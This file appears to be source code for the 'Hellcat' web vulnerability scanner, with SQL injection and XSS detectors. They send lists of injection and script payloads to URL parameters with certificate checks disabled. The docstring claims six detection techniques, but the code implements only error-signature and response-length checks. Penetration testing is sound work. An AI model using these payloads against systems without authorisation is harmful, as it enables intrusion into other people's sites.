"""
Hellcat SQLi Detector
=====================
Multi-technique SQL injection detection (error-based, boolean-blind,
time-based, UNION, stacked queries, inline comments).
"""
from __future__ import annotations

import re
import time
from typing import Any, Dict, List, Optional
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

from hellcat.core.detectors import BaseDetector, register_detector
from hellcat.core.models import DetectionResult, DetectorType, Severity

# Suppress SSL warnings for pentest targets
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Error signatures from major DBMS
SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySqlException",
    r"valid MySQL result", r"check the manual that corresponds to your MySQL",
    r"ORA-[0-9]{5}", r"Oracle error", r"Oracle.*Driver",
    r"Microsoft SQL Native Client error", r"ODBC SQL Server Driver",
    r"SQLServer JDBC Driver", r"com\.microsoft\.sqlserver",
    r"PostgreSQL.*ERROR", r"Warning.*\Wpg_", r"valid PostgreSQL result",
    r"Npgsql\.", r"PG::SyntaxError",
    r"SQLite3?::Exception", r"SQLITE_ERROR", r"sqlite3\.OperationalError",
    r"CLI Driver.*DB2", r"DB2 SQL error",
    r"Sybase message",
]

SQLI_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--",
    "\" OR 1=1--", "1' AND '1'='1", "' UNION SELECT NULL--",
    "'; WAITFOR DELAY '0:0:3'--", "' AND SLEEP(3)--",
    "1 AND 1=1", "1 AND 1=2", "' AND 'a'='a", "' AND 'a'='b",
    "1' ORDER BY 1--", "1' ORDER BY 100--",
    "admin'--", "' OR ''='", "') OR ('1'='1",
]


@register_detector("sqli", {"owasp": "A03:2021"})
class SQLiDetector(BaseDetector):
    name = "sqli"
    description = "SQL Injection detector (6 techniques)"
    vuln_type = "SQL Injection"
    severity = Severity.CRITICAL
    detector_type = DetectorType.INJECTION

    def detect(self, url: str, **kwargs: Any) -> List[DetectionResult]:
        self._log_start(url)
        results: List[DetectionResult] = []
        params = kwargs.get("params", {})

        if not params:
            parsed = urlparse(url)
            params = {k: v[0] for k, v in parse_qs(parsed.query).items()}

        for param_name in params:
            for payload in SQLI_PAYLOADS[:12]:
                finding = self._test_payload(url, param_name, payload, params)
                if finding:
                    results.append(finding)
                    break  # one finding per param is enough

        self._log_end(url, results)
        return results

    def _test_payload(self, url: str, param: str, payload: str,
                      original_params: Dict[str, str]) -> Optional[DetectionResult]:
        try:
            import requests
            # Baseline request
            base_resp = requests.get(url, params=original_params, timeout=10, verify=False)
            base_len = len(base_resp.text)

            # Injected request
            test_params = dict(original_params)
            test_params[param] = payload
            test_resp = requests.get(url, params=test_params, timeout=10, verify=False)

            # Error-based detection
            for pattern in SQL_ERROR_PATTERNS:
                if re.search(pattern, test_resp.text, re.IGNORECASE):
                    return self._create_result(
                        url, param=param, payload=payload,
                        evidence=f"SQL error pattern matched: {pattern}",
                        confidence=0.95, verified=True,
                        remediation="Use parameterized queries / prepared statements",
                    )

            # Boolean-based detection (response length diff)
            diff = abs(len(test_resp.text) - base_len)
            if diff > 100 and ("OR" in payload or "AND" in payload):
                return self._create_result(
                    url, param=param, payload=payload,
                    evidence=f"Response length diff: {diff} bytes",
                    confidence=0.7,
                    remediation="Use parameterized queries / prepared statements",
                )

        except Exception:
            pass
        return None

    def get_payloads(self) -> List[str]:
        return list(SQLI_PAYLOADS)


# ---------------------------------------------------------------------------
# XSS Detector
# ---------------------------------------------------------------------------

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'\"><img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src='javascript:alert(1)'>",
    "{{7*7}}", "${7*7}",
    "<details open ontoggle=alert(1)>",
    "'-alert(1)-'",
    "\"><script>alert(1)</script>",
    "<input onfocus=alert(1) autofocus>",
]

REFLECTION_MARKERS = [
    "hellcat_xss_probe_", "hc_reflect_test_",
]


@register_detector("xss", {"owasp": "A03:2021"})
class XSSDetector(BaseDetector):
    name = "xss"
    description = "Cross-Site Scripting detector (reflected/stored/DOM)"
    vuln_type = "Cross-Site Scripting"
    severity = Severity.HIGH
    detector_type = DetectorType.INJECTION

    def detect(self, url: str, **kwargs: Any) -> List[DetectionResult]:
        self._log_start(url)
        results: List[DetectionResult] = []
        params = kwargs.get("params", {})

        if not params:
            parsed = urlparse(url)
            params = {k: v[0] for k, v in parse_qs(parsed.query).items()}

        for param_name in params:
            # Phase 1: reflection test
            marker = f"{REFLECTION_MARKERS[0]}{int(time.time())}"
            if self._check_reflection(url, param_name, marker, params):
                # Phase 2: payload injection
                for payload in XSS_PAYLOADS[:8]:
                    finding = self._test_xss_payload(url, param_name, payload, params)
                    if finding:
                        results.append(finding)
                        break

        self._log_end(url, results)
        return results

    def _check_reflection(self, url: str, param: str, marker: str,
                          original_params: Dict[str, str]) -> bool:
        try:
            import requests
            test_params = dict(original_params)
            test_params[param] = marker
            resp = requests.get(url, params=test_params, timeout=10, verify=False)
            return marker in resp.text
        except Exception:
            return False

    def _test_xss_payload(self, url: str, param: str, payload: str,
                          original_params: Dict[str, str]) -> Optional[DetectionResult]:
        try:
            import requests
            test_params = dict(original_params)
            test_params[param] = payload
            resp = requests.get(url, params=test_params, timeout=10, verify=False)

            # Check if payload appears unencoded in response
            if payload in resp.text:
                return self._create_result(
                    url, param=param, payload=payload,
                    evidence="Payload reflected unencoded in response",
                    confidence=0.90, verified=True,
                    remediation="Encode output, implement CSP, sanitize input",
                )
            # Check for partial reflection (tag present)
            if "<script" in payload and "<script" in resp.text.lower():
                return self._create_result(
                    url, param=param, payload=payload,
                    evidence="Script tag reflected in response",
                    confidence=0.75,
                    remediation="Encode output, implement CSP, sanitize input",
                )
        except Exception:
            pass
        return None

    def get_payloads(self) -> List[str]:
        return list(XSS_PAYLOADS)
